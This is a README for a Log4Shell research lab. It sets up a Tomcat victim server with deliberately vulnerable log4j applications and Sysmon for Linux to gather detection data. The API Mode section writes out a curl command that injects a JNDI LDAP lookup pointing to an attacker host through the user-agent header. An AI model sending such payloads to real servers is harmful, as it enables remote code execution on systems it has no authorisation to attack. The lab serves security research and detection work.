# Victim Server

There are several lab environments being shared in the Infosec community that are helping security researchers to test and learn more about `Log4Shell`.
However, most of them use docker containers to not only deploy the vulnerable application, but also containerize the execution of code.
From a Linux perspective, this does not help while using tools such as "[Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux)" since it cannot be installed in containers yet.
I wanted to put together a research lab where I could replicate a basic real scenario with a vulnerable Web application and Sysmon for Linux running.

## Setup Resources

* [Tomcat v8.5.3](https://tomcat.apache.org/)
* Java Libraries:
    * [javax.servlet-api v4.0.1](https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api/4.0.1)
    * log4j-core ([2.14](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.0), [2.15](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.15.0), [2.16](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.16.0))
    * log4j-api ([2.14](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api/2.14.0), [2.15](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api/2.15.0), [2.16](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api/2.16.0))
* [Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux)

## Tomcat Server Setup (Linux)

SSH to your Linux VM and git clone this projet:

```bash
sudo su

git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```
run the bash script `Install-Tomcat.sh` to install and set up a [Tomcat](https://tomcat.apache.org/) server:

```Bash
cd log4jshell-lab/victim/tomcat

sh Install-Tomcat.sh
```

Check if the `Tomcat` service is running properly.

```
service tomcat status
```

## Prepare Vulnerable Applications

### Install Docker

We are going to use a Docker image to compile our vulnerable applications. You can use this script to install the latest Docker app in your Linux VM.

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh
chmod +x Install-Docker.sh

./Install-Docker.sh
```

### Compile Applications

We need to add vulnerable applications to our Tomcat server. This project comes with a few vulnerable java applications.
* [2.14.0](vuln-apps/2.14.0)
* [2.15.0](vuln-apps/2.15.0)
* [2.16.0](vuln-apps/2.16.0)

We need to compile our applications and create `.war` files to host the vulnerable aplications in our Tomcat server under `/opt/tomcat/webapps`.
The bash script `Compile-Apps.sh` compiles applications and copies `.war` files to `/opt/tomcat/webapps`:

```bash
cd log4jshell-lab/victim/vuln-apps/
chmod +x Compile-Apps.sh

sh Compile-Apps.sh
```

### Restart Tomcat Service

```Bash
service tomcat stop
service tomcat start
```

## Access Vulnerable Applications

Each application (`2.14.0`, `2.15.0`, `2.16.0`) has two modes:
* Browser - Login Form: `127.0.0.1:8080/Log4j-2.1*.0-SNAPSHOT/`
* API - GET Request: `127.0.0.1:8080/Log4j-2.1*.0-SNAPSHOT/api`

### Browser Mode
* If your Linux VM has a GUI, you can simply browse to `127.0.0.1:8080/Log4j-2.1*.0-SNAPSHOT/`.
* If your Linux VM does not have a GUI and you can only use the terminal, you can SSH tunnel your access to your vulnerable applications. Simply run the following commands in a new terminal.

```bash
ssh -L 8080:127.0.0.1:8080 wardog@[Public-IP-Linux-VM]
```

* You must use the `email` field to pass a `JNDI lookup` string to trigger the vulnerabilities.

### API Mode
* You can also SSH to your Tomcat server and interact with the application's basic API.
* You can use `curl` to perform a `GET` request:
* You must pass the `JNDI lookup` string via the `user-agent` header of the `GET` request:

```bash
curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=tomcat}' 127.0.0.1:8080/Log4j-2.*.0-SNAPSHOT/api
```

## Install Sysmon for Linux

If you want to generate some endpoint data, download the following bash script to automate the installation and configuration of [Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux):

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Sysmon-For-Linux.sh
chmod +x Install-Sysmon-For-Linux.sh

sh Install-Sysmon-For-Linux.sh --config https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/configs/sysmon/linux/sysmon.xml
```

## Exploiting Vulnerabilities

* Set up [Attacker server - Rogue JNDI](../attacker/README.md)
* Depending on which CVE you want to test, use the following research notes:
    * [CVE-2021-44228 Simulation](../research-notes/2021-12-11_01-CVE-2021-44228-simulation.md)
    * [CVE-2021-45046 Simulation](../research-notes/2022-01-03_01-CVE-2021-45046-simulation.md)

## Reference
* https://linuxize.com/post/how-to-install-tomcat-8-5-on-ubuntu-18-04/
* https://www.digitalocean.com/community/tutorials/install-tomcat-9-ubuntu-1804
* https://github.com/Sysinternals/SysmonForLinux